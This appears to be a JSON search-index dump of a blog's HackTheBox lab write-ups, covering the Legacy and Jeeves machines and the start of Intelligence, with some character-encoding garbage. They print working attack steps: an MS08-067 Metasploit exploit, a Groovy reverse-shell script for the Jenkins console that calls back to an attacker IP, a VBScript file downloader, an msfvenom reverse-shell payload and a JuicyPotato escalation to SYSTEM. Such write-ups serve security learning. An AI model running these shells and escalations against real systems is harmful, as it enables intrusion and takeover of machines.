\\---VideosC:\\Users\\Administrator>type Desktop\\root.txttype Desktop\\root.txtebb49aa407b0e60c562487e978ca3525```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Legacy", "url": "/posts/Legacy/", "categories": "HackTheBox", "tags": "Public Exploit, SMB, Windows", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Legacy]â””â”€$ rustscan -t 5000 -a 10.10.10.4 --ulimit 5000.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ ...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Legacy]â””â”€$ rustscan -t 5000 -a 10.10.10.4 --ulimit 5000.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------ðŸ˜µ https://admin.tryhackme.com[~] The config file is expected to be at \"/home/kali/.rustscan.toml\"[~] Automatically increasing ulimit value to 5000.Open 10.10.10.4:135Open 10.10.10.4:139Open 10.10.10.4:445[~] Starting Script(s)[>] Script to be run Some(\"nmap -vvv -p {{port}} {{ip}}\")NMAP SCAN Results â¤µï¸ â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Legacy]â””â”€$ sudo nmap -sV --script vuln -p 135,139,445 -T5 10.10.10.4Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 12:19 ISTNmap scan report for 10.10.10.4Host is up (0.37s latency).PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows XP microsoft-dsService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xpHost script results:| smb-vuln-ms08-067: | VULNERABLE:| Microsoft Windows system vulnerable to remote code execution (MS08-067)| State: VULNERABLE| IDs: CVE:CVE-2008-4250| The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,| Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary| code via a crafted RPC request that triggers the overflow during path canonicalization.| | Disclosure date: 2008-10-23| References:| https://technet.microsoft.com/en-us/library/security/ms08-067.aspx|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)|_smb-vuln-ms10-054: false|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED| smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).| | Disclosure date: 2017-03-14| References:| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143|_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx```{: .nolineno}## SMB Enumeration â¤µï¸Through Enumeration I got the SMB version vulnerable so lets exploit this version through metasploit C2 plateform â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Legacy]â””â”€$ msfconsole -q msf6 > search ms08-067Matching Modules========= # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms08_067_netapi 2008-10-28 great Yes MS08-067 Microsoft Server Service Relative Path Stack CorruptionInteract with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapimsf6 > use 0[*] No payload configured, defaulting to windows/meterpreter/reverse_tcpmsf6 exploit(windows/smb/ms08_067_netapi) > optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.0.2.77 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automatic TargetingView the full module info with the info, or info -d command.msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0LHOST => 10.10.16.6msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4RHOSTS => 10.10.10.4msf6 exploit(windows/smb/ms08_067_netapi) > run[*] Started reverse TCP handler on 10.10.16.6:4444 [*] 10.10.10.4:445 - Automatically detecting the target...[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...[*] Sending stage (175686 bytes) to 10.10.10.4[*] Meterpreter session 1 opened (10.10.16.6:4444 -> 10.10.10.4:1032) at 2023-12-28 12:24:58 +0530meterpreter > whoami[-] Unknown command: whoamimeterpreter > shellProcess 520 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\WINDOWS\\system32>C:\\WINDOWS\\system32>hostnamehostnamelegacyC:\\WINDOWS\\system32>cd ../../C:\\>systeminfosysteminfoHost Name: LEGACYOS Name: Microsoft Windows XP ProfessionalOS Version: 5.1.2600 Service Pack 3 Build 2600OS Manufacturer: Microsoft CorporationOS Configuration: Standalone WorkstationOS Build Type: Uniprocessor FreeRegistered Owner: userRegistered Organization: HTBProduct ID: 55274-643-7213323-23904Original Install Date: 16/3/2017, 7:32:23 ï¿½ï¿½System Up Time: 0 Days, 0 Hours, 36 Minutes, 5 SecondsSystem Manufacturer: VMware, Inc.System Model: VMware Virtual PlatformSystem type: X86-based PCProcessor(s): 1 Processor(s) Installed. [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2993 MhzBIOS Version: INTEL - 6040000Windows Directory: C:\\WINDOWSSystem Directory: C:\\WINDOWS\\system32Boot Device: \\Device\\HarddiskVolume1System Locale: en-us;English (United States)Input Locale: en-us;English (United States)Time Zone: (GMT+02:00) Athens, Beirut, Istanbul, MinskTotal Physical Memory: 1.023 MBAvailable Physical Memory: 805 MBVirtual Memory: Max Size: 2.048 MBVirtual Memory: Available: 2.005 MBVirtual Memory: In Use: 43 MBPage File Location(s): C:\\pagefile.sysDomain: HTBLogon Server: N/AHotfix(s): 1 Hotfix(s) Installed. [01]: Q147222NetWork Card(s): 1 NIC(s) Installed. [01]: VMware Accelerated AMD PCNet Adapter Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.4C:\\>dirdir Volume in drive C has no label. Volume Serial Number is 54BF-723B Directory of C:\\16/03/2017 07:30 ï¿½ï¿½ 0 AUTOEXEC.BAT16/03/2017 07:30 ï¿½ï¿½ 0 CONFIG.SYS16/03/2017 08:07 ï¿½ï¿½ Documents and Settings29/12/2017 10:41 ï¿½ï¿½ Program Files18/05/2022 02:10 ï¿½ï¿½ WINDOWS 2 File(s) 0 bytes 3 Dir(s) 6.342.119.424 bytes freeC:\\>cd \"Documents and Settings\"cd \"Documents and Settings\"C:\\Documents and Settings>dirdir Volume in drive C has no label. Volume Serial Number is 54BF-723B Directory of C:\\Documents and Settings16/03/2017 08:07 ï¿½ï¿½ .16/03/2017 08:07 ï¿½ï¿½ ..16/03/2017 08:07 ï¿½ï¿½ Administrator16/03/2017 07:29 ï¿½ï¿½ All Users16/03/2017 07:33 ï¿½ï¿½ john 0 File(s) 0 bytes 5 Dir(s) 6.342.115.328 bytes freeC:\\Documents and Settings>cd johncd johnC:\\Documents and Settings\\john>dirdir Volume in drive C has no label. Volume Serial Number is 54BF-723B Directory of C:\\Documents and Settings\\john16/03/2017 07:33 ï¿½ï¿½ .16/03/2017 07:33 ï¿½ï¿½ ..16/03/2017 08:19 ï¿½ï¿½ Desktop16/03/2017 07:33 ï¿½ï¿½ Favorites16/03/2017 07:33 ï¿½ï¿½ My Documents16/03/2017 07:20 ï¿½ï¿½ Start Menu 0 File(s) 0 bytes 6 Dir(s) 6.342.115.328 bytes freeC:\\Documents and Settings\\john>tree /a /ftree /a /fFolder PATH listingVolume serial number is 00610050 54BF:723BC:.+---Desktop| user.txt| +---Favorites| | MSN.com.url| | Radio Station Guide.url| | | \\---Links| Customize Links.url| Free Hotmail.url| Windows Marketplace.url| Windows Media.url| Windows.url| +---My Documents| +---My Music| | Sample Music.lnk| | | \\---My Pictures| Sample Pictures.lnk| \\---Start Menu \\---Programs | Internet Explorer.lnk | Outlook Express.lnk | Remote Assistance.lnk | Windows Media Player.lnk | +---Accessories | | Address Book.lnk | | Command Prompt.lnk | | Notepad.lnk | | Program Compatibility Wizard.lnk | | Synchronize.lnk | | Tour Windows XP.lnk | | Windows Explorer.lnk | | | +---Accessibility | | Magnifier.lnk | | Narrator.lnk | | On-Screen Keyboard.lnk | | Utility Manager.lnk | | | \\---Entertainment | Windows Media Player.lnk | \\---StartupC:\\Documents and Settings\\john>cd Desktopcd DesktopC:\\Documents and Settings\\john\\Desktop>type user.txttype user.txte69af0e4f443de7e36876fda4ec7644fC:\\Documents and Settings\\john\\Desktop>cd ../../cd ../../C:\\Documents and Settings>cd Administratorcd AdministratorC:\\Documents and Settings\\Administrator>dirdir Volume in drive C has no label. Volume Serial Number is 54BF-723B Directory of C:\\Documents and Settings\\Administrator16/03/2017 08:07 ï¿½ï¿½ .16/03/2017 08:07 ï¿½ï¿½ ..16/03/2017 08:18 ï¿½ï¿½ Desktop16/03/2017 08:07 ï¿½ï¿½ Favorites16/03/2017 08:07 ï¿½ï¿½ My Documents16/03/2017 07:20 ï¿½ï¿½ Start Menu 0 File(s) 0 bytes 6 Dir(s) 6.342.098.944 bytes freeC:\\Documents and Settings\\Administrator>cd Desktopcd DesktopC:\\Documents and Settings\\Administrator\\Desktop>dirdir Volume in drive C has no label. Volume Serial Number is 54BF-723B Directory of C:\\Documents and Settings\\Administrator\\Desktop16/03/2017 08:18 ï¿½ï¿½ .16/03/2017 08:18 ï¿½ï¿½ ..16/03/2017 08:18 ï¿½ï¿½ 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 6.342.094.848 bytes freeC:\\Documents and Settings\\Administrator\\Desktop>type root.txttype root.txt993442d258b0e0ec917cae9e695d5713```{: .nolineno}I got the Administrators Access !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Jeeves", "url": "/posts/Jeeves/", "categories": "HackTheBox", "tags": "Jenkins, JuicyPotato, PrivEsc, SeImpersonatePrivilege, Windows", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jeeves]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.63Nmap scan report for 10.10.10.63Host is up (0.36s latency).Not show...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jeeves]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.63Nmap scan report for 10.10.10.63Host is up (0.36s latency).Not shown: 65531 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Ask Jeeves135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)50000/tcp open http Jetty 9.4.z-SNAPSHOT|_http-title: Error 404 Not Found|_http-server-header: Jetty(9.4.z-SNAPSHOT)Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s| smb2-time: | date: 2023-12-30T16:56:00|_ start_date: 2023-12-28T20:39:24| smb-security-mode: | authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not requiredService detection performed.```{: .nolineno}## Web Enumeration â¤µï¸I loaded the port 80 site but not got anything â†’![Untitled](Jeeves/Untitled%201.png)I then checked port 50000 and I got the Jetty 9.4.z site â†’![Untitled](Jeeves/Untitled%202.png)Then I ran directory or files bruteforcing and got this directory â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jeeves]â””â”€$ cat ferox_50000.json 200 GET 147l 319w 3744c http://10.10.10.63/style.css200 GET 1l 4w 50c http://10.10.10.63/error.html200 GET 17l 40w 503c http://10.10.10.63/302 GET 0l 0w 0c http://10.10.10.63:50000/askjeeves => http://10.10.10.63:50000/askjeeves/```{: .nolineno}I loaded this URL and I got a jenkins site so lets loaded the **Script Console** on this site :![Untitled](Jeeves/Untitled%203.png)I ran this Groovy script to gain the reverse shell â†’```bashString host=\"10.10.16.10\";int port=4444;String cmd=\"cmd\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();```{: .nolineno}```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jeeves]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.10.63] 49704Microsoft Windows [Version 10.0.10586](c) 2015 Microsoft Corporation. All rights reserved.C:\\Users\\Administrator\\.jenkins>whoamiwhoamijeeves\\kohsukeC:\\Users\\Administrator\\.jenkins>```{: .nolineno}I checked the privileges and got `SeImpersonatePrivilege` Enabled :```bashPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= =SeShutdownPrivilege Shut down the system DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station DisabledSeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledSeTimeZonePrivilege Change the time zone Disabled```{: .nolineno}Lets Transfer the `JuicyPotato.exe` Tool to get Impersonate the Privileges :I tried `certutil.exe` but it did not worked so I used `vbscript` method of `cscript` to transfer the files to victim machine like this â†’Lets run this in Victim machine â†’```vbnetecho strUrl = WScript.Arguments.Item(0) > wget.vbsecho StrFile = WScript.Arguments.Item(1) >> wget.vbsecho Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbsecho Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbsecho Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbsecho Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbsecho Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbsecho Err.Clear >> wget.vbsecho Set http = Nothing >> wget.vbsecho Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbsecho If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbsecho If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbsecho If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbsecho http.Open \"GET\", strURL, False >> wget.vbsecho http.Send >> wget.vbsecho varByteArray = http.ResponseBody >> wget.vbsecho Set http = Nothing >> wget.vbsecho Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbsecho Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbsecho strData = \"\" >> wget.vbsecho strBuffer = \"\" >> wget.vbsecho For lngCounter = 0 to UBound(varByteArray) >> wget.vbsecho ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbsecho Next >> wget.vbsecho ts.Close >> wget.vbs```{: .nolineno}And Now run this command that will transfer the file from attacker machine to victim machine like this â†’```bashcscript wget.vbs http://10.10.16.10/JuicyPotato.exe JuicyPotato.exe```{: .nolineno}in shell like this :```powershellC:\\Temp>cscript wget.vbs http://10.10.16.10/JuicyPotato.exe JuicyPotato.execscript wget.vbs http://10.10.16.10/JuicyPotato.exe JuicyPotato.exeMicrosoft (R) Windows Script Host Version 5.812Copyright (C) Microsoft Corporation. All rights reserved.C:\\Temp>```{: .nolineno}I got the JuicyPotato executable file now so lets upload a bat file that will give me a Administatorâ€™s reverse shell â†’```bashmsfvenom -p cmd/windows/reverse_powershell lhost=10.10.16.10 lport=443 > shell.bat```{: .nolineno}I then transfered this bat file through cscript command only so lets run it and get a `nt\\authority system` shell â†’```powershellC:\\Temp>JuicyPotato.exe -t * -p shell.bat -l 4444JuicyPotato.exe -t * -p shell.bat -l 4444Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444......[+] authresult 0{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM[+] CreateProcessWithTokenW OKC:\\Temp>JuicyPotato.exe -t * -p shell.bat -l 4444JuicyPotato.exe -t * -p shell.bat -l 4444Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444......[+] authresult 0{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM[+] CreateProcessWithTokenW OKC:\\Temp>```{: .nolineno}I started the netcat listener at port 443 and got the shell â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Jeeves]â””â”€$ nc -lvnp 443 listening on [any] 443 ...connect to [10.10.16.10] from (UNKNOWN) [10.10.10.63] 49783Microsoft Windows [Version 10.0.10586](c) 2015 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>whoamiwhoamint authority\\systemC:\\Windows\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>dirdir Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of C:\\Users\\Administrator11/03/2017 10:07 PM .11/03/2017 10:07 PM ..11/03/2017 09:43 PM .groovy12/30/2023 12:39 PM .jenkins11/03/2017 09:03 PM Contacts11/08/2017 09:05 AM Desktop11/03/2017 09:03 PM Documents11/03/2017 09:33 PM Downloads11/03/2017 09:03 PM Favorites11/03/2017 09:16 PM Links11/03/2017 09:03 PM Music11/03/2017 09:16 PM OneDrive11/03/2017 09:03 PM Pictures11/03/2017 09:03 PM Saved Games11/03/2017 09:10 PM Searches11/03/2017 09:03 PM Videos 0 File(s) 0 bytes 16 Dir(s) 2,497,990,656 bytes freeC:\\Users\\Administrator>```{: .nolineno}I got the user.txt file and for root.txt I got this message â†’```powershellC:\\Users\\Administrator\\Desktop>dirdir Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of C:\\Users\\Administrator\\Desktop11/08/2017 09:05 AM .11/08/2017 09:05 AM ..12/24/2017 02:51 AM 36 hm.txt11/08/2017 09:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 2,497,990,656 bytes freeC:\\Users\\Administrator\\Desktop>type hm.txttype hm.txtThe flag is elsewhere. Look deeper.C:\\Users\\Administrator\\Desktop> ```{: .nolineno}For looking deeper I through of looking into the alternate stream of the file and I got the root.txt file â†’```powershellC:\\Users\\Administrator\\Desktop>dir /Rdir /R Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of C:\\Users\\Administrator\\Desktop11/08/2017 09:05 AM .11/08/2017 09:05 AM ..12/24/2017 02:51 AM 36 hm.txt 34 hm.txt:root.txt:$DATA11/08/2017 09:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 2,497,994,752 bytes freeC:\\Users\\Administrator\\Desktop>```{: .nolineno}to read the content of this data stream file lets use this command â†’```powershellC:\\Users\\Administrator\\Desktop>more ```{: .nolineno}I am Administrator now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Intelligence", "url": "/posts/Intelligence/", "categories": "HackTheBox", "tags": "Active Directory, AllowedToDelegate, BloodHound, PrivEsc, ReadGMSAPassword, Service Ticket, dnstool.py, GetST.py, krbrelayx, pdftotext", "date": "2024-01-25 00:00:00 +0530", "snippet": "Port Scan Results â¤µï¸â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.248 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 16:35 IST...", "content": "Port Scan Results â¤µï¸â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.248 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 16:35 ISTNmap scan report for 10.10.10.248Host is up (0.11s latency).Not shown: 65515 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: Intelligence| http-methods: |_ Potentially risky methods: TRACE88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-14 18:11:59Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)|_ssl-date: 2024-01-14T18:13:31+00:00; +7h00m01s from scanner time.| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)|_ssl-date: 2024-01-14T18:13:32+00:00; +7h00m01s from scanner time.| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:163268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16|_ssl-date: 2024-01-14T18:13:32+00:00; +7h00m00s from scanner time.3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16|_ssl-date: 2024-01-14T18:13:32+00:00; +7h00m01s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49667/tcp open msrpc Microsoft Windows RPC49683/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049684/tcp open msrpc Microsoft Windows RPC49694/tcp open msrpc Microsoft Windows RPC49736/tcp open msrpc Microsoft Windows RPC50908/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s| smb2-time: | date: 2024-01-14T18:12:52|_ start_date: N/A| smb2-security-mode: | 3:1:1: |_ Message signing enabled and requiredWeb Enumeration â¤µï¸I checked port 80 and I got this site â†’I can access some pdf files from this site like this â†’with name /documents/2020-01-01-upload.pdf to /documents/2020-12-15-upload.pdf so for sake of enumeration I have download all the pdf file from the starting date to ending date pdfs.For that I created a bash script file that will generate a wordlist of these dates with file name in it into a file â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ cat date-wordlist.sh #!/bin/bashstart_date=\"2020-01-01\"end_date=\"2020-12-15\"current_date=\"$start_date\"echo \"$current_date-upload.pdf\"while [[ \"$current_date\" != \"$end_date\" ]]; do current_date=$(date -I -d \"$current_date + 1 day\") filename=$current_date\"-upload.pdf\"; echo \"$filename\" doneecho \"$end_date-upload.pdf\"I got this filenames.txt file so lets try to access some 200 status of files and its content downloaded on our attacker machine.â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ ./date-wordlist.sh &gt; filename.txt â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ ffuf -u http://intelligence.htb/documents/FUZZ -w filename.txt -o accessible_files.txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev________________________________________________ :: Method : GET :: URL : http://intelligence.htb/documents/FUZZ :: Wordlist : FUZZ: /home/kali/Downloads/HTB/Intelligence/filename.txt :: Output file : accessible_files.txt :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500________________________________________________2020-01-20-upload.pdf [Status: 200, Size: 11632, Words: 157, Lines: 127, Duration: 297ms]2020-01-22-upload.pdf [Status: 200, Size: 28637, Words: 236, Lines: 224, Duration: 293ms]2020-01-30-upload.pdf [Status: 200, Size: 26706, Words: 242, Lines: 193, Duration: 216ms]2020-01-10-upload.pdf [Status: 200, Size: 26400, Words: 232, Lines: 205, Duration: 391ms]2020-02-17-upload.pdf [Status: 200, Size: 11228, Words: 167, Lines: 132, Duration: 132ms]2020-02-28-upload.pdf [Status: 200, Size: 11543, Words: 167, Lines: 131, Duration: 163ms]2020-01-25-upload.pdf [Status: 200, Size: 26252, Words: 225, Lines: 193, Duration: 385ms]2020-03-13-upload.pdf [Status: 200, Size: 24888, Words: 213, Lines: 204, Duration: 125ms]......Now I saved these output into a file called accessible_files.txt so lets short it into another file â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ for i in $(seq 1 80);do cat accessible_files.txt| jq \".results.[$i].url\";done | sed 's/\"//g' &gt; files.txt â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ cat files.txthttp://intelligence.htb/documents/2020-01-20-upload.pdfhttp://intelligence.htb/documents/2020-02-17-upload.pdfhttp://intelligence.htb/documents/2020-01-30-upload.pdf......Now download time â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ for i in $(cat files.txt); do wget $i;done --2024-01-15 15:35:08-- http://intelligence.htb/documents/2020-01-20-upload.pdfResolving intelligence.htb (intelligence.htb)... 10.10.10.248Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 11632 (11K) [application/pdf]Saving to: â€˜2020-01-20-upload.pdfâ€™2020-01-20-upload.pdf 100%[====================================================================&gt;] 11.36K --.-KB/s in 0.08s 2024-01-15 15:35:09 (139 KB/s) - â€˜2020-01-20-upload.pdfâ€™ saved [11632/11632]--2024-01-15 15:35:09-- http://intelligence.htb/documents/2020-02-17-upload.pdfResolving intelligence.htb (intelligence.htb)... 10.10.10.248Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 11228 (11K) [application/pdf]Saving to: â€˜2020-02-17-upload.pdfâ€™2020-02-17-upload.pdf 100%[====================================================================&gt;] 10.96K --.-KB/s in 0.08s 2024-01-15 15:35:09 (139 KB/s) - â€˜2020-02-17-upload.pdfâ€™ saved [11228/11228]......I got all the files downloaded lets enumerate the values of each files with any uniqueness values in it â†’I can see some Creators value from exiftool Tool inspection â†’â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Intelligence]â””â”€$ exiftool 2020-01-02-upload.pdfExifTool Version Number : 12.70File Name : 2020-01-02-upload.pdfDirectory : .File Size : 27 kBFile Modification Date/Time : 2021:04:01 22:30:00+05:30File Access Date/Time : 2024:01:15 18:29:35+05:30File Inode Change Date/Time : 2024:01:15 15:35:12+05:30File Permissions : 